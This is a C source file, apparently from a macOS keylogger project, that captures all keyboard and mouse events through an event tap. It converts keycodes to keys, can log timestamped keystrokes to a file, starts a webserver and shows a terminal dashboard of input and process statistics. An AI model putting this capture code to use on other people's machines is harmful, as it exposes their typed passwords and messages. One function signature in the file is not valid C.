/**********************************/
#define WRITE_LOG_FILE          false
#define DELETE_DATABASE_FILE    true
#define LOG_TIME_ENABLED        false
#define LOG_PATH_ENABLED        true
#define WEBSERVER_ENABLED       true
#define SQL_ENABLED             true
/**********************************/
#include "../include/keylogger.h"
#include "../src/includes.c"
/**********************************/
#include "config.c"
#include "mouse.c"
#include "osx_exec.c"
#include "sql.c"
#include "window_utils.c"
#include "windows.c"
/**********************************/
CFArrayRef windowList;
/**********************************/
#include "keybinds.c"
#include "osx_utils.c"
/**********************************/
#include "webserver.c"
/**********************************/
volatile unsigned long
  events_qty       = 0,
  started          = 0,
  mouse_events_qty = 0,
  kb_events_qty    = 0
;
/**********************************/
CGPoint mouse_location, previous_mouse_location;
double  mouse_distance = 0;


/**********************************/
void get_mouse_distance(int px, py, cx, cy){
  double dx = abs(cx - px);
  double dy = abs(cy - py);
  double d  = sqrt((dx * dx) + (dy * dy));

  mouse_distance += d;
  term_move_to(0, 0);
  log_ok("mouse distance:   x:%.2lf|y:%.2lf -> %.2lf |    %.2lf                               ", dx, dy, d, mouse_distance);
}


/**********************************/
char *mouse_distance_pixels_string(){
  char *s = malloc(1024);

  sprintf(s, "%.2lf", mouse_distance);
  return(strdup(s));
}


/**********************************/
/**********************************/
#define ITEM(TYPE, LABEL, VALUE)    {                            \
    stringbuffer_append_string(sb, "\n");                        \
    stringbuffer_append_string(sb, AC_RESETALL);                 \
    stringbuffer_append_string(sb, LABEL ":");                   \
    stringbuffer_append_string(sb, AC_RESETALL AC_BLUE AC_BOLD); \
    TYPE(sb, VALUE);                                             \
    stringbuffer_append_string(sb, AC_RESETALL);                 \
    stringbuffer_append_string(sb, "\t");                        \
}


/**********************************/


/**********************************/
focused_t * get_focused_process(){
  focused_t           *f           = malloc(sizeof(focused_t));
  char                *processName = malloc(1024);
  ProcessSerialNumber psn;
  OSErr               err = GetFrontProcess(&psn);

  if (err == noErr) {
    ProcessInfoRec info;
    if (processName) {
      bzero(processName, 1024);
      info.processInfoLength = sizeof(ProcessInfoRec);
      info.processName       = processName;
      err                    = GetProcessInformation(&psn, &info);
      if (err == noErr) {
        f->name = trim(strdup(processName));
        GetProcessPID(&psn, &(f->pid));
        return(f);
      }else{
        log_error("process name err!");
      }
      free(processName);
    }
  }else{
    log_error("getFrontProcess err!");
  }
  return(f);
}
/**********************************/
CGEventMask mouse_and_kb_events = (
  ///////////////////////////////////////
  CGEventMaskBit(kCGEventKeyDown)
  | CGEventMaskBit(kCGEventKeyUp)
  ///////////////////////////////////////
  | CGEventMaskBit(kCGEventFlagsChanged)
  | CGEventMaskBit(kCGEventLeftMouseDown)
  | CGEventMaskBit(kCGEventLeftMouseUp)
  | CGEventMaskBit(kCGEventRightMouseDown)
  | CGEventMaskBit(kCGEventRightMouseUp)
  | CGEventMaskBit(kCGEventMouseMoved)
  | CGEventMaskBit(kCGEventLeftMouseDragged)
  | CGEventMaskBit(kCGEventRightMouseDragged)
  ///////////////////////////////////////
  );


/**********************************/
void append_keystroke_log(const char *ckc){
  char *l = malloc(1024);

  sprintf(l, "%lu:%s\n", timestamp(), (char *)ckc);
  fsio_append_text_file(logfileLocation, l);
}


/**********************************/
void tap_events(){
  CFRunLoopRun();
}


void setup_event_tap(){
  CFMachPortRef event_tap = CGEventTapCreate(
    kCGSessionEventTap, kCGHeadInsertEventTap, 0, mouse_and_kb_events, event_handler, NULL
    );

  if (!event_tap) {
    log_fatal("ERROR: Unable to create keyboard event tap.");
    exit(1);
  }

  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);

  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
  CGEventTapEnable(event_tap, true);
}


/**********************************/
void init_sql(){
  if (DELETE_DATABASE_FILE) {
    if (fsio_file_exists(DATABASE_FILE)) {
      fsio_remove(DATABASE_FILE);
    }
  }

  if (!fsio_file_exists(DATABASE_FILE)) {
    sql_create();
  }

  sql_insert();

  sql_select_statement();
  sql_select();

  sleep(1);
}


/**********************************/
void init(const int argc, const char **argv){
  started = timestamp();
  term_hide_cursor();
  log_set_level(MY_LOG_LEVEL);
  config_main(argc, argv);
  if (SQL_ENABLED) {
    init_sql();
  }
  if (WEBSERVER_ENABLED) {
    webserver_thread();
  }
  keystates        = list_new();
  downkeys         = list_new();
  downkeys_history = list_new();
  sb               = stringbuffer_new_with_options(1024, true);
}


CGEventRef ___event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  tq_start("___event_handler duration");
  unsigned long
    ts = timestamp();
  bool
    key_up = (type == kCGEventKeyUp), key_down = (type == kCGEventKeyDown),
    is_mouse    = IsMouseEvent(type),
    is_keyboard = is_mouse ? false : true;
  char
  *action = "";

  events_qty++;
  if (key_up) {
    action = "UP";
  }else if (key_down) {
    action = "DOWN";
  }else{
    action = "UNKNOWN";
  }
  if (last_ts < 1) {
    last_ts = ts;
  }

  if (mouse_events_qty == 0 || is_mouse) {
    mouse_location = CGEventGetLocation(event);
  }
  if (is_mouse) {
    if (mouse_events_qty > 0) {
      get_mouse_distance(previous_mouse_location.x, previous_mouse_location.y, mouse_location.x, mouse_location.y);
      previous_mouse_location.x = mouse_location.x;
      previous_mouse_location.y = mouse_location.y;
    }
    mouse_events_qty++;
  }else if (is_keyboard) {
    kb_events_qty++;
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) {
      log_error("\nreturning type %d\n", type);
      return(0);

      return(event);
    }
  }


  tq_start("getKeyCode");
  CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
  char      *keyCode_dur;

  keyCode_dur = tq_stop("getKeyCode");

  tq_start("convertKeyCode");
  const char *ckc           = convertKeyCode(keyCode);
  char       *keyString_dur = tq_stop("convertKeyCode");
  bool       do_post_set    = true;

  if (keycode_is_down((int)keyCode)) {
    if (WRITE_LOG_FILE && is_keyboard) {
      append_keystroke_log((const char *)ckc);
    }
    set_keycode_state(keyCode, key_down);
    do_post_set = false;
  }

  int           handled = handle_key((const int)keyCode, (const char *)ckc);
  unsigned long runtime = timestamp() - started;

  stringbuffer_clear(sb);

  ITEM(stringbuffer_append_string, "Event Type", (is_mouse ? "Mouse" : "Keyboard"));

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL "log:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, (char *)logfileLocation);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_BLUE_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_string(sb, bytes_to_string(fsio_file_size((char *)logfileLocation)));
  stringbuffer_append_string(sb, AC_RESETALL ")]\t  ");

  ITEM(stringbuffer_append_int, "Keyboard Events", kb_events_qty);
  ITEM(stringbuffer_append_int, "Mouse Events", mouse_events_qty);
  ITEM(stringbuffer_append_int, "Events", events_qty);

  focused_t   *fp = get_focused_process();
  pid_stats_t *ps = get_pid_stats((int)fp->pid);

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, AC_RESETALL "focused:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, fp->name);
  stringbuffer_append_string(sb, "|");
  stringbuffer_append_int(sb, fp->pid);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_BLUE_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->fds_qty);
  stringbuffer_append_string(sb, AC_RESETALL " File Descriptors)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_MAGENTA_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->open_files_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Open Files)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_YELLOW_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->sockets_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Open Sockets)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_CYAN_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->listening_ports_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Listening Ports)|" AC_RESETALL);
  stringbuffer_append_string(sb, "|(" AC_RESETALL);
  stringbuffer_append_string(sb, AC_REVERSED AC_BRIGHT_RED_BLACK AC_BOLD AC_UNDERLINE);
  stringbuffer_append_int(sb, ps->connections_qty);
  stringbuffer_append_string(sb, AC_RESETALL " Connections)|" AC_RESETALL);
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "mouse location:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_int(sb, mouse_location.x);
  stringbuffer_append_string(sb, "/");
  stringbuffer_append_int(sb, mouse_location.y);
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "runtime:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  stringbuffer_append_string(sb, milliseconds_to_long_string(runtime));
  stringbuffer_append_string(sb, "]\t  ");
  stringbuffer_append_string(sb, "\n");

  stringbuffer_append_string(sb, AC_RESETALL "last_ms:");
  stringbuffer_append_string(sb, AC_RESETALL AC_BOLD AC_YELLOW);
  stringbuffer_append_string(sb, "[");
  if ((ts - last_ts) < 100) {
    stringbuffer_append_string(sb, "0");
  }
  stringbuffer_append_unsigned_long(sb, (ts - last_ts));
  stringbuffer_append_string(sb, "]\t  ");

  ITEM(stringbuffer_append_string, "Action", (char *)action);
  ITEM(stringbuffer_append_int, "Handled", handled);
  ITEM(stringbuffer_append_int, "Type", type);
  ITEM(stringbuffer_append_int, "Code", keyCode);
  ITEM(stringbuffer_append_string, "Key", (char *)ckc);
  ITEM(stringbuffer_append_string, "Keys", (char *)get_key_with_downkeys((char *)ckc));
  ITEM(stringbuffer_append_string, "Down Keys", (char *)get_downkeys_strs());
  ITEM(stringbuffer_append_int, "Down Qty", down_keycodes_qty());
  ITEM(stringbuffer_append_int, "Uptime", getUptime());
  ITEM(stringbuffer_append_string, "Mouse Pixels Distance", mouse_distance_pixels_string());
  //ITEM(stringbuffer_append_int, "# USB Devices", get_usb_devices_qty());
  ITEM(stringbuffer_append_int, "# Processes", get_procs_qty());
  ITEM(stringbuffer_append_int, "# Windows", get_windows_qty());

  if (false) {
    stringbuffer_append_string(sb, keyCode_dur);
    stringbuffer_append_string(sb, "\t");

    stringbuffer_append_string(sb, keyString_dur);
    stringbuffer_append_string(sb, "\t");
  }

  stringbuffer_append_string(sb, "\n");
  stringbuffer_append_string(sb, tq_stop("___event_handler duration"));

  last_ts = ts;
  char *msg1 = AC_RESETALL AC_WHITE_BLACK "👌" AC_RESETALL;
  char *msg2 = AC_RESETALL AC_YELLOW " ⚡ " AC_RESETALL;

  term_erase("screen");
//  term_reset();
// term_hide_cursor();
  int w = 0, h = 0;

  term_size(&w, &h);

  term_move_to(0, 0);
  printf(AC_RESETALL AC_BLUE AC_REVERSED "%s" AC_RESETALL "", msg2);

  term_move_to(0, 5);
  term_move_to((w - strlen(msg1) + 1), 0);
  printf(AC_RESETALL AC_BLUE AC_REVERSED "%s" AC_RESETALL "", msg1);


  term_move_to(0, 5);
  fprintf(stdout, "\n=============================\n");
  fprintf(stdout, "%s", stringbuffer_to_string(sb));
  fprintf(stdout, "\n=============================\n");
  fprintf(stdout, "\n\n");

  fprintf(stdout, "\n=============================\n");
  iterate_windows();
  fprintf(stdout, "=============================\n");

  if (do_post_set) {
    set_keycode_is_down(keyCode);
  }


  fflush(stdout);
  fflush(stderr);
  return(event);
} /* CGEventCallback */


CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  tq_start("event_handler duration");
  CGEventRef r    = ___event_handler(proxy, type, event, refcon);
  char       *dur = tq_stop("event_handler duration");

  fprintf(stdout, "\n\n");
  fprintf(stdout, "\n=============================\n");
  log_debug("%s", dur);
  fprintf(stdout, "=============================\n");
  return(r);
}


/**********************************/
int main(const int argc, const char *argv[]) {
  //do_procs();
  //exit(0);
  init(argc, argv);
  setup_event_tap();
  tap_events();
  return(0);
}
/**********************************/
